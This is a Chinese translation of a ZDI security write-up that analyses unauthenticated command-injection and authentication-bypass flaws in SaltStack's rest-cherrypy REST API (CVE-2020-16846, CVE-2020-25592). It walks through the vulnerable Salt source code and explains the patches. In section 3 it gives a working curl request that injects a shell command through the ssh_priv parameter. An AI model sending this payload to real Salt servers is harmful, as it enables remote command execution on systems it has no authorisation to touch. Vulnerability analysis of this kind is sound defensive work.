> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dR-Nq-pi2R5Aqz73XibD3Q)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb6pibzrFGuA3YGTpC5daWCyn3wtp1Qyy6M3XjQfziaX1CZY9V2g82nqV4al8libavruzibh9jGWGASI8g/640?wx_fmt=jpeg)

一、概述

11 月 3 日，SaltStack 发布了 Salt 的安全补丁，修复了三个高危漏洞。其中有两个修复程序，是为了解决外部研究人员通过 ZDI 项目提交的五个漏洞。这些漏洞可导致在运行 Salt 应用程序的系统上实现未经身份验证的命令注入。ZDI-CAN-11143 是由一位匿名研究人员提交给 ZDI 的，而其余的漏洞则是我们发现的 ZDI-CAN-11143 的变体。在这篇文章中，我们将详细研究这些漏洞的根本原因。

二、漏洞详情

漏洞影响应用程序的 rest-cherrypy netapi 模块。rest-cherrypy 模块为 Salt 提供 REST API。该模块来源于 Python 的 CherryPy 模块，在默认情况下未启用。如果要启用 rest-cherrypy 模块，主配置文件 / etc/salt/master 中必须加入以下行：

```
rest_cherrypy: 
  Port: 8000 
  Disable_ssl: true

```

其中，/run 终端非常重要。它通过 salt-ssh 子系统发出命令，而 salt-ssh 子系统会使用 SSH 来执行 Salt 例程。  
发送到 / run API 的 POST 请求将调用 salt.netapi.rest_cherrypy.app.Run 类的 POST() 方法，这个类最终会调用 salt.netapi.NetapiClient 的 run() 方法：

```
class NetapiClient(object): 
    # [... Truncated ...] 

    salt.exceptions.SaltInvocationError( 
               # "Invalid client specified: '{0}'".format(low.get("client")) 
                "Invalid client specified: '{0}'".format(CLIENTS) 
            ) 

        if not ("token" in low or "eauth" in low): 
            raise salt.exceptions.EauthAuthenticationError( 
                "No authentication credentials given" 
            ) 

        if low.get("raw_shell") and not self.opts.get("netapi_allow_raw_shell"): 
            raise salt.exceptions.EauthAuthenticationError( 
                "Raw shell option not allowed." 
            ) 

        l_fun = getattr(self, low["client"]) 
        f_call = salt.utils.args.format_call(l_fun, low) 
        return l_fun(*f_call.get("args", ()), **f_call.get("kwargs", {})) 

 def local_batch(self, *args, **kwargs): 
        """ 
        Run :ref:`execution modules <all-salt.modules>` against batches of minions 

        .. versionadded:: 0.8.4 

        Wraps :py:meth:`salt.client.LocalClient.cmd_batch` 

        :return: Returns the result from the execution module for each batch of 
            returns 
        """ 
        local = salt.client.get_local_client(mopts=self.opts) 
        return local.cmd_batch(*args, **kwargs) 

    def ssh(self, *args, **kwargs): 
        """ 
        Run salt-ssh commands synchronously 

        Wraps :py:meth:`salt.client.ssh.client.SSHClient.cmd_sync`. 

        :return: Returns the result from the salt-ssh command 
        """ 
        ssh_client = salt.client.ssh.client.SSHClient( 
            mopts=self.opts, disable_custom_roster=True 
        ) 
        return ssh_client.cmd_sync(kwargs)

```

如上所示，run() 方法负责验证 client 参数的值。client 参数的有效值包括 local、local_async、local_batch、local_subset、runner、runner_async、ssh、wheel 和 wheel_async。在验证了 client 参数后，它将检查请求中是否存在 token 或 eauth 参数。值得关注的是，这个方法无法验证 token 或 eauth 参数的值。因此，无论 token 或 eauth 参数是任何值，都可以通过检查。在通过检查后，该方法会根据 client 参数的值，去调用相应的方法。

如果 client 参数值为 ssh 时，将触发漏洞。在这种情况下，run() 方法将调用 ssh() 方法。ssh() 方法通过调用 salt.client.ssh.client.SSHClient 类的 cmd_sync() 方法同步执行 ssh-salt 命令，最终会调用_prep_ssh() 方法。

```
class SSHClient(object): 
    # [... Truncated] 

    def _prep_ssh( 
        self, tgt, fun, arg=(), timeout=None, tgt_type="glob", kwarg=None, **kwargs 
    ): 
        """ 
        Prepare the arguments 
        """ 
        opts = copy.deepcopy(self.opts) 
        opts.update(kwargs) 
        if timeout: 
            opts["timeout"] = timeout 
        arg = salt.utils.args.condition_input(arg, kwarg) 
        opts["argv"] = [fun] + arg 
        opts["selected_target_option"] = tgt_type 
        opts["tgt"] = tgt 
        return salt.client.ssh.SSH(opts) 

    def cmd( 
        self, tgt, fun, arg=(), timeout=None, tgt_type="glob", kwarg=None, **kwargs 
    ): 
        ssh = self._prep_ssh(tgt, fun, arg, timeout, tgt_type, kwarg, **kwargs) #<-------------- calls ZDI-CAN-11143 
        final = {} 
        for ret in ssh.run_iter(jid=kwargs.get("jid", None)): #<------------- ZDI-CAN-11173 
            final.update(ret) 
        return final 

    def cmd_sync(self, low): 
        kwargs = copy.deepcopy(low) 

        for ignore in ["tgt", "fun", "arg", "timeout", "tgt_type", "kwarg"]: 
            if ignore in kwargs: 
                del kwargs[ignore] 

        return self.cmd( 
            low["tgt"], 
            low["fun"], 
            low.get("arg", []), 
            low.get("timeout"), 
            low.get("tgt_type"), 
            low.get("kwarg"), 
            **kwargs 
        )            #<------------------- calls

```

_prep_ssh() 函数设置参数，并初始化 SSH 对象。

三、触发漏洞

触发漏洞的请求如下：

```
curl -i $salt_ip_addr:8000/run -H "Content-type: application/json" -d '{"client":"ssh","tgt":"A","fun":"B","eauth":"C","ssh_priv":"|id>/tmp/test#"}' 

```

在这里，client 参数的值为 ssh，存在漏洞的参数是 ssh_priv。在内部，ssh_priv 参数在 SSH 对象初始化期间会用到，如下所示：

```
SSH(object): 
    """ 
    Create an SSH execution system 
    """ 

    ROSTER_UPDATE_FLAG = "#__needs_update" 

    def __init__(self, opts): 
        self.__parsed_rosters = {SSH.ROSTER_UPDATE_FLAG: True} 
        pull_sock = os.path.join(opts["sock_dir"], "master_event_pull.ipc") 
        if os.path.exists(pull_sock) and zmq: 
            self.event = salt.utils.event.get_event( 
                "master", opts["sock_dir"], opts["transport"], opts=opts, listen=False 
            ) 
        else: 
            self.event = None 
        self.opts = opts 
        if self.opts["regen_thin"]: 
            self.opts["ssh_wipe"] = True 
        if not salt.utils.path.which("ssh"): 
            raise salt.exceptions.SaltSystemExit( 
                code=-1, 
                msg="No ssh binary found in path -- ssh must be installed for salt-ssh to run. Exiting.", 
            ) 
        self.opts["_ssh_version"] = ssh_version() 
        self.tgt_type = ( 
            self.opts["selected_target_option"] 
            if self.opts["selected_target_option"] 
            else "glob" 
        ) 
        self._expand_target() 
        self.roster = salt.roster.Roster(self.opts, self.opts.get("roster", "flat")) 
        self.targets = self.roster.targets(self.opts["tgt"], self.tgt_type) 
        if not self.targets: 
            self._update_targets() 
        # If we're in a wfunc, we need to get the ssh key location from the 
        # top level opts, stored in __master_opts__ 
        if "__master_opts__" in self.opts: 
            if self.opts["__master_opts__"].get("ssh_use_home_key") and os.path.isfile( 
                os.path.expanduser("~/.ssh/id_rsa") 
            ): 
                priv = os.path.expanduser("~/.ssh/id_rsa") 
            else: 
                priv = self.opts["__master_opts__"].get( 
                    "ssh_priv", 
                    os.path.join( 
                        self.opts["__master_opts__"]["pki_dir"], "ssh", "salt-ssh.rsa" 
                    ), 
                ) 
        else: 
            priv = self.opts.get( 
                "ssh_priv", os.path.join(self.opts["pki_dir"], "ssh", "salt-ssh.rsa") 
            ) 
        if priv != "agent-forwarding": 
            if not os.path.isfile(priv): 
                try: 
                    salt.client.ssh.shell.gen_key(priv) 
                except OSError: 
                    raise salt.exceptions.SaltClientError( 
                        "salt-ssh could not be run because it could not generate keys.\n\n" 
                        "You can probably resolve this by executing this script with " 
                        "increased permissions via sudo or by running as root.\n" 
                        "You could also use the '-c' option to supply a configuration " 
                        "directory that you have permissions to read and write to." 
                    )

```

ssh_priv 参数的值用于 SSH 私有文件。如果 ssh_priv 值对应的文件不存在，则调用 / salt/client/ssh/shell.py 的 gen_key() 方法来创建文件，并将 ssh_priv 作为 path 参数传递给该方法。基本上，gen_key() 方法生成公钥和私钥密钥对，并将其存储在 path 参数定义的文件中。

```
def gen_key(path): 
    """ 
    Generate a key for use with salt-ssh 
    """ 
    cmd = 'ssh-keygen -P "" -f {0} -t rsa -q'.format(path) 
    if not os.path.isdir(os.path.dirname(path)): 
        os.makedirs(os.path.dirname(path)) 
    subprocess.call(cmd, shell=True)

```

从上面的方法中我们可以看到，这里并没有清除路径，且在后续的 Shell 命令中使用了该路径来创建 RSA 密钥对。如果 ssh_priv 包含命令注入字符，则可以在通过 subprocess.call() 方法执行命令时执行用户控制的命令。这样就导致攻击者可以在运行 Salt 应用程序的系统上运行任意命令。

在进一步研究 SSH 对象初始化方法之后，可以观察到多个变量设置为用户控制的 HTTP 参数的值。随后，这些变量在 shell 命令中用作执行 SSH 命令的参数。在这里，user、port、remote_port_forwards 和 ssh_options 变量非常容易受到攻击，如下所示：

```
class SSH(object): 
    """ 
    Create an SSH execution system 
    """ 

    ROSTER_UPDATE_FLAG = "#__needs_update" 

    def __init__(self, opts): 
    # [...] 


 self.targets = self.roster.targets(self.opts["tgt"], self.tgt_type) 
        if not self.targets: 
            self._update_targets() 
    # [...] 
     self.defaults = { 
            "user": self.opts.get( 
                "ssh_user", salt.config.DEFAULT_MASTER_OPTS["ssh_user"] 
            ),  
            "port": self.opts.get( 
                "ssh_port", salt.config.DEFAULT_MASTER_OPTS["ssh_port"] 
            ),  # <------------- vulnerable parameter 
            "passwd": self.opts.get( 
                "ssh_passwd", salt.config.DEFAULT_MASTER_OPTS["ssh_passwd"] 
            ), 
            "priv": priv, 
            "priv_passwd": self.opts.get( 
                "ssh_priv_passwd", salt.config.DEFAULT_MASTER_OPTS["ssh_priv_passwd"] 
            ), 
            "timeout": self.opts.get( 
                "ssh_timeout", salt.config.DEFAULT_MASTER_OPTS["ssh_timeout"] 
            ) 
            + self.opts.get("timeout", salt.config.DEFAULT_MASTER_OPTS["timeout"]), 
            "sudo": self.opts.get( 
                "ssh_sudo", salt.config.DEFAULT_MASTER_OPTS["ssh_sudo"] 
            ), 
            "sudo_user": self.opts.get( 
                "ssh_sudo_user", salt.config.DEFAULT_MASTER_OPTS["ssh_sudo_user"] 
            ), 
            "identities_only": self.opts.get( 
                "ssh_identities_only", 
                salt.config.DEFAULT_MASTER_OPTS["ssh_identities_only"], 
            ), 
            "remote_port_forwards": self.opts.get("ssh_remote_port_forwards"), # <------------- vulnerable parameter 
            "ssh_options": self.opts.get("ssh_options"), # <------------- vulnerable parameter 
        } 

    def _update_targets(self): 
        """ 
        Update targets in case hostname was directly passed without the roster. 
        :return: 
        """ 
        hostname = self.opts.get("tgt", "")  
        if "@" in hostname: 
            user, hostname = hostname.split("@", 1) # <------------- vulnerable parameter 
        else: 
            user = self.opts.get("ssh_user") # <------------- vulnerable parameter  
        if hostname == "*": 
            hostname = "" 

        if salt.utils.network.is_reachable_host(hostname): 
            hostname = salt.utils.network.ip_to_host(hostname) 
            self.opts["tgt"] = hostname 
            self.targets[hostname] = { 
                "passwd": self.opts.get("ssh_passwd", ""), 
                "host": hostname, 
                "user": user, 
            } 
            if self.opts.get("ssh_update_roster"): 
                self._update_roster()

```

_update_targets() 方法设置 user 变量，该变量取决于 tgt 或 ssh_user 的值。如果 HTTP 参数 tgt 的值使用了 “username@localhost”的格式，则会将 “username” 分配给用户变量。否则，user 的值由 ssh_user 参数设置。port、remote_port_forwards 和 ssh_options 的值分别由 HTTP 参数 ssh_port、ssh_remote_port_forwards 和 ssh_options 定义。

在初始化 SSH 对象后，_prep_ssh() 方法通过 handle_ssh() 产生一个子进程，最终会执行 salt.client.ssh.shell.Shell 类的 exec_cmd() 方法。

```
def exec_cmd(self, cmd): 
        """ 
        Execute a remote command 
        """ 
        cmd = self._cmd_str(cmd) 

        logmsg = "Executing command: {0}".format(cmd) 
        if self.passwd: 
            logmsg = logmsg.replace(self.passwd, ("*" * 6)) 
        if 'decode("base64")' in logmsg or "base64.b64decode(" in logmsg: 
            log.debug("Executed SHIM command. Command logged to TRACE") 
            log.trace(logmsg) 
        else: 
            log.debug(logmsg) 

        ret = self._run_cmd(cmd)  # <--------------- calls 
        return ret 

    def _cmd_str(self, cmd, ssh="ssh"): 
        """ 
        Return the cmd string to execute 
        """ 

        # TODO: if tty, then our SSH_SHIM cannot be supplied from STDIN Will 
        # need to deliver the SHIM to the remote host and execute it there 

        command = [ssh] 
        if ssh != "scp": 
            command.append(self.host) 
        if self.tty and ssh == "ssh": 
            command.append("-t -t") 
        if self.passwd or self.priv: 
            command.append(self.priv and self._key_opts() or self._passwd_opts()) 
        if ssh != "scp" and self.remote_port_forwards: 
            command.append( 
                " ".join( 
                    [ 
                        "-R {0}".format(item) 
                        for item in self.remote_port_forwards.split(",") 
                    ] 
                ) 
            ) 
        if self.ssh_options: 
            command.append(self._ssh_opts()) 

        command.append(cmd) 

        return " ".join(command) 

    def _run_cmd(self, cmd, key_accept=False, passwd_retries=3): 
        # [...] 

        term = salt.utils.vt.Terminal( 
            cmd, 
            shell=True, 
            log_stdout=True, 
            log_stdout_level="trace", 
            log_stderr=True, 
            log_stderr_level="trace", 
            stream_stdout=False, 
            stream_stderr=False, 
        ) 
        sent_passwd = 0 
        send_password = True 
        ret_stdout = "" 
        ret_stderr = "" 
        old_stdout = "" 

        try: 
            while term.has_unread_data: 
                stdout, stderr = term.recv()

```

如上述代码所示，exec_cmd() 首先调用 the_cmd_str() 方法来创建一个命令字符串，而不进行任何验证。然后，它通过显式调用系统 Shell 程序，调用_run_cmd() 来执行命令。这会将命令注入字符视为 Shell 的元字符，而并非是命令的参数。一旦执行这个精心设计的命令字符串，就可能会导致任意命令注入。

四、总结

SaltStack 发布了修复程序，以解决命令注入和身份验证绕过漏洞。同时，他们为这两个漏洞分配了编号 CVE-2020-16846 和 CVE-2020-25592。CVE-2020-16846 的修复原理是在执行命令时禁用系统 Shell，以此来解决漏洞问题。禁用系统 Shell 意味着 Shell 元字符会被视为第一个命令的参数的一部分。

CVE-2020-25592 的修复原理是添加对 eauth 和 token 参数的验证，以此来修复漏洞。这样一来，就仅允许有效用户通过 rest-cherrypy netapi 模块访问 salt-ssh 功能。这是我们的 ZDI 项目中收到的第一个 SaltStack 漏洞，后续的工作也非常重要。我们期待以后能接收到更多的提交报告。

大家可以关注我的 Twitter @ nktropy，跟进团队研究进展，获取最新的漏洞利用技术和安全补丁。

**译文声明**  

译文仅供参考，具体内容表达以及含义原文为准。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  

------------------------------------------------------------------------------------------------------------------------------------------------

  

**戳 “阅读原文” 查看更多内容**